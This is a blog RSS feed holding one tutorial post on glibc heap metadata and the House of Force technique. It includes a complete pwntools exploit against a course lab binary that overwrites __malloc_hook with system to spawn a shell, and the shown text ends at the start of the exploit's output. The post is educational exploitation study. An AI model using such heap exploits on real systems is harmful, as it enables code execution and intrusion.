<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Adam Gold</title>
    
    
    
    <link>https://adamgold.github.io/</link>
    <description>Recent content on Adam Gold</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 01 Aug 2020 17:47:42 +0300</lastBuildDate>
    
	<atom:link href="https://adamgold.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Basic Heap Exploitation: House of Force</title>
      <link>https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/</link>
      <pubDate>Sat, 01 Aug 2020 17:47:42 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/</guid>
      <description>
        
          &lt;img src=&#34;https://adamgold.github.io/img/heap_visual.png&#34;/&gt;
          
        
        
        &lt;p&gt;I recently finished a Linux heap exploitation &lt;a href=&#34;https://www.udemy.com/course/linux-heap-exploitation-part-1/?referralCode=362370A773BCC3F2730A&#34;&gt;course&lt;/a&gt; (Referral link is instructor&amp;rsquo;s, not mine!), aimed to teach how the heap works and some popular exploitation techniques that are possible to execute once you are familiar with the heap&amp;rsquo;s metadata. In this short article, I will try to showcase some of the things that I have learned, with some examples.&lt;/p&gt;
&lt;h2 id=&#34;learning-the-basics-of-the-heap&#34;&gt;Learning the Basics of the Heap&lt;/h2&gt;
&lt;p&gt;Before diving into the exploitation details, you first need to understand what the heap is and its metadata structure.&lt;/p&gt;
&lt;h3 id=&#34;what-is-the-heap&#34;&gt;What is the heap?&lt;/h3&gt;
&lt;p&gt;The heap is the portion of memory where dynamically allocated memory resides. Dynamic memory allocating is used when a program does not know the size or number of objects in memory it needs prior to runtime (hence dynamic).
Unlike the stack where memory is allocated and released in a very defined order, individual data elements allocated on the heap are typically released in ways which is asynchronous from one another.&lt;/p&gt;
&lt;p&gt;Heap memory is essentially a large pool of memory (typically per process) from which the running program can request chunks during runtime. The heap is divided into &amp;ldquo;chunk&amp;rdquo; - large, contiguous blocks of memory requested from the kernel.&lt;/p&gt;
&lt;p&gt;You may think that this is only relevant to low-level programming, for example the usage of &lt;code&gt;malloc&lt;/code&gt; in C (which will be covered later in this article) - But the heap is actually being used under the hood in many of the basic programming operations, even in high level languages such as Python or Ruby.&lt;/p&gt;
&lt;p&gt;The heap is organized and implemented by a series of data structures, forming the heap metadata.&lt;/p&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			It&amp;rsquo;s important to note that throughout this post, only the GLIBC heap implementation will be discussed.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;heap-metadata&#34;&gt;Heap Metadata&lt;/h3&gt;
&lt;p&gt;In order to see and understand how the heap is implemented, you will need to have an understanding of the &lt;code&gt;malloc&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;GLIBC&amp;rsquo;s &lt;code&gt;malloc&lt;/code&gt; function allows developers to request dynamic memory allocation. It takes a single argument - the size in bytes, and returns a pointer to that amount of memory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can see, it&amp;rsquo;s very simple to use. This means that all of the &amp;ldquo;magic&amp;rdquo; happens under the hood - And what can be more exciting than unrevealing it?&lt;/p&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			If you wish to explore further, you can check out &lt;code&gt;malloc&lt;/code&gt;&#39;s &lt;a href=&#34;https://code.woboq.org/userspace/glibc/malloc/malloc.c.html&#34;&gt;source code&lt;/a&gt;.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;debugging-with-gdb&#34;&gt;Debugging with &lt;code&gt;gdb&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Suppose a programmer asks for, say, 16 bytes of memory. To service this request, the heap manager needs to do more than just find a random 16 byte region that the programmer can write to. The heap manager also needs to store metadata about the allocation. This metadata is stored alongside the 16-byte region that the programmer can use.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s hop onto &lt;code&gt;gdb&lt;/code&gt; to see how it plays out.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;In file: /home/adamgold/Documents/malloc_demo.c
    5     char *e = malloc(16);
    6
    7     malloc(1);
    8     malloc(0);
    9
   10     malloc(24);
   11     malloc(25);
   12
 â–º 13     return 0;
   14 }

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The code above requests 5 chunk - with sizes of 16, 1, 0, 24 and 25. The breakpoint is set just after the request for the 25-bytes chunk. Using the &lt;code&gt;vis_heap_chunks&lt;/code&gt; (or &lt;code&gt;vis&lt;/code&gt;) command to display the heap, you can inspect the heap layout:&lt;/p&gt;

&lt;figure &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/heap_visual.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;Let&amp;rsquo;s break it down: We can see 7 different colors, although only 5 chunk requested. As mentioned before, metadata is stored inline - The heap does not store user data alone.&lt;/p&gt;
&lt;p&gt;There are 4 parts that start with &lt;code&gt;0x0000000000000021&lt;/code&gt; followed by 24 bytes. The first 8 bytes are the size field - It&amp;rsquo;s where the size of each chunk is saved, along with some flags such as the &amp;ldquo;prev in use&amp;rdquo; flag. The following 24 bytes are the user data. You can see that 24 bytes have been assigned to all of the first 4 requests - Even though we requested for 16, 1, 0 and 24 respectively. This is because &lt;code&gt;malloc&lt;/code&gt; has a minimum chunk size of 24 bytes of user data - even when using &lt;code&gt;malloc(0)&lt;/code&gt;. So, the size is filled with &lt;code&gt;0x20&lt;/code&gt; (=32), which is 24 bytes of user data + 8 bytes of meta data.
After that, you can see a size field of &lt;code&gt;0x31&lt;/code&gt;. This means that the size field increment in 8 each time - 40 bytes for &lt;code&gt;malloc(25)&lt;/code&gt;. This is why the least significant bit is not used (&lt;code&gt;0x20&lt;/code&gt;, &lt;code&gt;0x30&lt;/code&gt;, &lt;code&gt;0x40&lt;/code&gt;&amp;hellip;) and can be used for flags.&lt;/p&gt;
&lt;p&gt;If you were wondering what the &amp;ldquo;prev in use&amp;rdquo; flag does - It&amp;rsquo;s there to mark if the previous chunk is freed or not. Chunks are in either of 2 mutually exclusive states: allocated or free. When a chunk is free, up to 5 quadwords of its user data are repurposed as metadata.&lt;/p&gt;
&lt;p&gt;The last value - &lt;code&gt;0x0000000000020f51&lt;/code&gt; states the size of the &amp;ldquo;top chunk&amp;rdquo; - meaning the size of all the remaining memory in the heap.&lt;/p&gt;
&lt;p&gt;This is where we&amp;rsquo;ll stop exploring the heap metadata for this post - But there is much more to learn, such as the types of freed chunks, unlinking vulnerabilities, and many more. The House of Force technique does not require this knowledge.&lt;/p&gt;
&lt;h2 id=&#34;discovering-the-house-of-force-technique&#34;&gt;Discovering the House of Force Technique&lt;/h2&gt;
&lt;p&gt;The House of Force technique is a simple one for achieving code execution on older binaries. It does not rely on complicated internal logics (such as House of Orange, for example) but it is a good start and, yeah, it&amp;rsquo;s pretty cool!&lt;/p&gt;
&lt;h3 id=&#34;understanding-the-theory&#34;&gt;Understanding the theory&lt;/h3&gt;
&lt;p&gt;In GLIBC versions &amp;lt; 2.29, top chunk size fields are not subject to any integrity checks during allocations. This means that you can write any value into it.&lt;/p&gt;
&lt;p&gt;Basically, what you are going to be doing is to overflow a chunk in order to write a really large value into the &amp;ldquo;wilderness&amp;rdquo;, the top chunk. This will allow you to wrap around the virtual address space and then when you make another request, you&amp;rsquo;ll be able to get any address you want in memory. For example, you&amp;rsquo;ll be able to get addresses from the binary data section (which is in a lower address than the heap). Sounds complicated? Fear not! Let&amp;rsquo;s exploit an actual binary.&lt;/p&gt;
&lt;h3 id=&#34;exploiting-a-binary-using-house-of-force&#34;&gt;Exploiting a binary using House of Force&lt;/h3&gt;
&lt;p&gt;We are going to exploit a very simple binary, just to showcase the HOF technique. The binary is available after purchasing the course.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    RUNPATH:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../.glibc/glibc_2.28_no-tcache&amp;#39;&lt;/span&gt;
pwndbg&amp;gt; r
Starting program: /home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force

&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt;
|   HeapLAB   |  House of Force
&lt;span style=&#34;color:#f92672&#34;&gt;===============&lt;/span&gt;

puts&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; @ 0x7ffff7a8ef10
heap @ 0x603000

1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; malloc 0/4
2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; target
3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; quit

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary leaks the address of libc &lt;code&gt;puts&lt;/code&gt; and the heap base address for simplicity. It is linked to GLIBC 2.28, so we can use the HOF technique.&lt;/p&gt;
&lt;p&gt;After some time playing with the binary, it seems that there&amp;rsquo;s a heap overflow when using the malloc functionality. Here&amp;rsquo;s a quick proof of concept showing an override of the top chunk:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;house_of_force&amp;#34;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;libc

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gs)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; process(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)

&lt;span style=&#34;color:#75715e&#34;&gt;# Select the &amp;#34;malloc&amp;#34; option, send size &amp;amp; data.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(size, data):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{size}&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data: &amp;#34;&lt;/span&gt;, data)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the address of puts(), use it to resolve the libc load address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts() @ &amp;#34;&lt;/span&gt;)
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the heap start address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &amp;#34;&lt;/span&gt;)
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;))

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......
0x603010	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x603020	0x5959595959595959	0xffffffffffffffff	YYYYYYYY........ &amp;lt;-- Top chunk

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What&amp;rsquo;s left to do now is to get a shell by interrupting the program flow, easy right?&lt;/p&gt;
&lt;p&gt;We can use &lt;code&gt;__malloc_hook&lt;/code&gt;, a function that is being called before &lt;code&gt;malloc&lt;/code&gt; - Overriding it with the &lt;code&gt;system&lt;/code&gt; address could give a shell!&lt;/p&gt;
&lt;p&gt;The distance from the top chunk required to is &lt;code&gt;MALLOC_HOOK_ADDRESS - (HEAP_BASE + 0x20)&lt;/code&gt;. Notice the &lt;code&gt;0x20&lt;/code&gt; required to account for the already allocated chunk. We can add the following allocation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;distance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__malloc_hook &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
malloc(distance, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And when running the script with gdb:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; dq &amp;amp;__malloc_hook
00007ffff7dd0c10     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
00007ffff7dd0c20     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; ffff8000088323f9
00007ffff7dd0c30     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
00007ffff7dd0c40     &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
pwndbg&amp;gt; top_chunk
Top chunk
Addr: 0x7ffff7dd0c20
Size: 0xffff8000088323f9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great! Our &lt;code&gt;top_chunk&lt;/code&gt; is right at the start of &lt;code&gt;__malloc_hook&lt;/code&gt;. One more request will enable us to overwrite the hook.&lt;/p&gt;
&lt;p&gt;But before we do that, &lt;code&gt;system&lt;/code&gt; will have to be called with &lt;code&gt;/bin/sh&lt;/code&gt;. We can insert &lt;code&gt;bin/sh&lt;/code&gt; right before the hook - as we know the address there. For that to work, we would need to overwrite &lt;code&gt;0x20&lt;/code&gt; bits before the hook, write &lt;code&gt;/bin/sh&lt;/code&gt;, and then make one more allocation request for the actual address overriding. Final exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;house_of_force&amp;#34;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;libc

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gs)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; process(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)

&lt;span style=&#34;color:#75715e&#34;&gt;# Select the &amp;#34;malloc&amp;#34; option, send size &amp;amp; data.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(size, data):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{size}&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data: &amp;#34;&lt;/span&gt;, data)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the address of puts(), use it to resolve the libc load address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts() @ &amp;#34;&lt;/span&gt;)
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts

&lt;span style=&#34;color:#75715e&#34;&gt;# This binary leaks the heap start address.&lt;/span&gt;
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &amp;#34;&lt;/span&gt;)
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;))
distance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__malloc_hook &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
malloc(distance, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# start with /bin/sh and place the chunk right before malloc hook&lt;/span&gt;
malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system)) &lt;span style=&#34;color:#75715e&#34;&gt;# overwrite malloc hook&lt;/span&gt;

cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# address to /bin/sh (parameter to malloc which is essentialy parameter to system)&lt;/span&gt;
malloc(cmd, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And there&amp;rsquo;s our shell!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Documents/courses/HeapLAB/house_of_force$ python3 exp.py
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    RUNPATH:  b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../.glibc/glibc_2.28_no-tcache&amp;#39;&lt;/span&gt;
